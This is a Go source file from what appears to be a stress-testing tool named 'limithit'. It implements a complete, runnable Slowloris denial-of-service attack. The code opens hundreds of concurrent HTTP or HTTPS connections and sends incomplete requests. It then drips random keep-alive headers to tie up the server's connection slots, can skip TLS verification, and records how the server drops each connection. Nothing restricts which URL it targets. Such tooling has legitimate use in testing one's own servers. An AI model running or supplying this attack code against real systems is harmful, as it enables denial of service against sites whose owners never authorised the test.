package slowloris

import (
	"context"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"math/rand/v2"
	"net"
	"net/url"
	"sync"
	"time"

	"github.com/conantorreswf/limithit/internal/attacks"
	"github.com/conantorreswf/limithit/internal/metrics"
)

func init() {
	attacks.Register("slowloris", func() attacks.Attack { return &Slowloris{} })
}

type Slowloris struct {
	connections    int
	headerInterval int
	hold           int
	dialTimeout    int
	insecure       bool
}

func (s *Slowloris) Name() string     { return "slowloris" }
func (s *Slowloris) Synopsis() string { return "hold many connections open with slow header drip" }

func (s *Slowloris) Flags(fs *flag.FlagSet) {
	fs.IntVar(&s.connections, "connections", 200, "concurrent open connections")
	fs.IntVar(&s.headerInterval, "header-interval", 10, "seconds between drip headers")
	fs.IntVar(&s.hold, "hold", 120, "total hold duration per connection (seconds)")
	fs.IntVar(&s.dialTimeout, "dial-timeout", 5, "dial timeout seconds")
	fs.BoolVar(&s.insecure, "insecure", false, "skip TLS verification")
}

func (s *Slowloris) Validate() error {
	if s.connections < 1 {
		return errors.New("connections must be >= 1")
	}
	return nil
}

func (s *Slowloris) Run(ctx context.Context, base attacks.Base) (attacks.Report, error) {
	opts := options{
		URL:             base.URL,
		Connections:     s.connections,
		HeaderInterval:  time.Duration(s.headerInterval) * time.Second,
		Hold:            time.Duration(s.hold) * time.Second,
		DialTimeout:     time.Duration(s.dialTimeout) * time.Second,
		WriteTimeout:    5 * time.Second,
		InsecureSkipTLS: s.insecure,
	}
	rep, err := run(ctx, opts)
	if err != nil {
		return nil, err
	}
	return rep, nil
}

type options struct {
	URL             string
	Connections     int
	HeaderInterval  time.Duration
	Hold            time.Duration
	DialTimeout     time.Duration
	WriteTimeout    time.Duration
	InsecureSkipTLS bool
}

func run(ctx context.Context, opts options) (*metrics.ConnReport, error) {
	if opts.Connections < 1 {
		opts.Connections = 1
	}
	if opts.HeaderInterval <= 0 {
		opts.HeaderInterval = 10 * time.Second
	}
	if opts.Hold <= 0 {
		opts.Hold = 120 * time.Second
	}
	if opts.DialTimeout <= 0 {
		opts.DialTimeout = 5 * time.Second
	}
	if opts.WriteTimeout <= 0 {
		opts.WriteTimeout = 5 * time.Second
	}

	u, err := url.Parse(opts.URL)
	if err != nil {
		return nil, fmt.Errorf("slowloris: invalid url: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return nil, fmt.Errorf("slowloris: scheme must be http or https")
	}
	host := u.Host
	if _, _, splitErr := net.SplitHostPort(host); splitErr != nil {
		if u.Scheme == "https" {
			host = host + ":443"
		} else {
			host = host + ":80"
		}
	}
	path := u.Path
	if path == "" {
		path = "/"
	}

	cc := metrics.NewConnCollector()
	start := time.Now()

	var wg sync.WaitGroup
	for i := 0; i < opts.Connections; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			holdOne(ctx, id, host, path, u, opts, cc)
		}(i)

		select {
		case <-ctx.Done():
			break
		case <-time.After(time.Duration(rand.Int64N(10)) * time.Millisecond):
		}
	}
	wg.Wait()
	return cc.Finalize(time.Since(start)), nil
}

func holdOne(ctx context.Context, _ int, host, path string, u *url.URL, opts options, cc *metrics.ConnCollector) {
	cc.Attempt()

	dialer := &net.Dialer{Timeout: opts.DialTimeout}
	var conn net.Conn
	var err error
	if u.Scheme == "https" {
		conn, err = tls.DialWithDialer(dialer, "tcp", host, &tls.Config{
			InsecureSkipVerify: opts.InsecureSkipTLS,
			ServerName:         hostname(host),
		})
	} else {
		conn, err = dialer.DialContext(ctx, "tcp", host)
	}
	if err != nil {
		cc.Error(classifyErr(err))
		return
	}
	defer conn.Close()
	cc.Established()

	openedAt := time.Now()
	initial := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: limithit-slowloris\r\nAccept: */*\r\n",
		path, hostname(host))
	_ = conn.SetWriteDeadline(time.Now().Add(opts.WriteTimeout))
	n, err := conn.Write([]byte(initial))
	cc.AddBytes(int64(n))
	if err != nil {
		cc.DroppedByServer(time.Since(openedAt))
		cc.Error("initial-write:" + classifyErr(err))
		return
	}

	deadline := time.NewTimer(opts.Hold)
	defer deadline.Stop()
	ticker := time.NewTicker(opts.HeaderInterval)
	defer ticker.Stop()

	headerIdx := 0
	for {
		select {
		case <-ctx.Done():
			cc.DroppedClient(time.Since(openedAt))
			return
		case <-deadline.C:
			cc.DroppedClient(time.Since(openedAt))
			return
		case <-ticker.C:
			drip := fmt.Sprintf("X-Keep-Alive-%d: %x\r\n", headerIdx, rand.Uint64())
			headerIdx++
			_ = conn.SetWriteDeadline(time.Now().Add(opts.WriteTimeout))
			n, err := conn.Write([]byte(drip))
			cc.AddBytes(int64(n))
			if err != nil {
				cc.DroppedByServer(time.Since(openedAt))
				cc.Error("drip-write:" + classifyErr(err))
				return
			}
			_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
			var probe [1]byte
			if _, rerr := conn.Read(probe[:]); rerr != nil {
				var ne net.Error
				if errors.As(rerr, &ne) && ne.Timeout() {
					// expected — server hasn't responded yet
				} else {
					cc.DroppedByServer(time.Since(openedAt))
					cc.Error("drip-eof:" + classifyErr(rerr))
					return
				}
			} else {
				cc.DroppedByServer(time.Since(openedAt))
				cc.Error("drip-resp")
				return
			}
		}
	}
}

func hostname(h string) string {
	host, _, err := net.SplitHostPort(h)
	if err != nil {
		return h
	}
	return host
}

func classifyErr(err error) string {
	if err == nil {
		return ""
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "timeout"
	}
	s := err.Error()
	switch {
	case contains(s, "refused"):
		return "refused"
	case contains(s, "reset"):
		return "reset"
	case contains(s, "broken pipe"):
		return "broken-pipe"
	case contains(s, "closed"):
		return "closed"
	default:
		return "other"
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
